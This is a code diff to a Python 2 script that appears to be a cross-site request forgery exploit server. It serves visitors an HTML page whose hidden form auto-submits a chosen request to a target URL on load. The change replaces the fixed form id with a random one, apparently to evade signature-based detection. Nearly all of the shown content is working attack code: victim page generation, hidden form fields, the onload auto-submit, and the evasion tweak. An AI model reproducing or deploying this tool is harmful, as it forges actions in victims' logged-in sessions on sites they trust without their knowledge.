@@ -1,6 +1,7 @@
 from BaseHTTPServer import HTTPServer
 from SimpleHTTPServer import SimpleHTTPRequestHandler
 import sys
+import random
 
 global_url = global_parameters = global_method = global_payload = ''
 
@@ -11,7 +12,7 @@ class HTTPHandler (SimpleHTTPRequestHandler):
 		print "[+] New connection: %s:%d" % (self.client_address[0], self.client_address[1])
 		self.index()
 
-	def prepare_request(self):
+	def prepare_request(self, csrf_name):
 		global global_url
 		global global_parameters
 		global global_method
@@ -23,7 +24,7 @@ class HTTPHandler (SimpleHTTPRequestHandler):
 			global_payload = global_payload.replace("[EXPLOIT]", global_url)
 			return global_payload
 		elif global_method.lower() == "post":
-			result = "<form id='payload' action='"+global_url+"' method='post'>"
+			result = "<form id='"+csrf_name+"' action='"+global_url+"' method='post'>"
 			for key, value in global_parameters.items():
 				result += "<input type='hidden' name='"+key+"' value='"+value+"'>"
 			result += "</form>"
@@ -32,9 +33,10 @@ class HTTPHandler (SimpleHTTPRequestHandler):
 	def index(self):
 		global global_method
 		if global_method.lower() == "get":
-			html_response = '<html><head></head><body>'+self.prepare_request()+'</body></html>'
+			html_response = '<html><head></head><body>'+self.prepare_request('')+'</body></html>'
 		else:
-			html_response = '<html><head></head><body onload="document.getElementById(\'payload\').submit()">'+self.prepare_request()+'</body></html>'
+			csrf_name = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16))
+			html_response = '<html><head></head><body onload="document.getElementById(\''+csrf_name+'\').submit()">'+self.prepare_request(csrf_name)+'</body></html>'
 		self.send_response(200)
 		self.send_header("Content-type", "text/html")
 		self.send_header("Content-length", len(html_response))
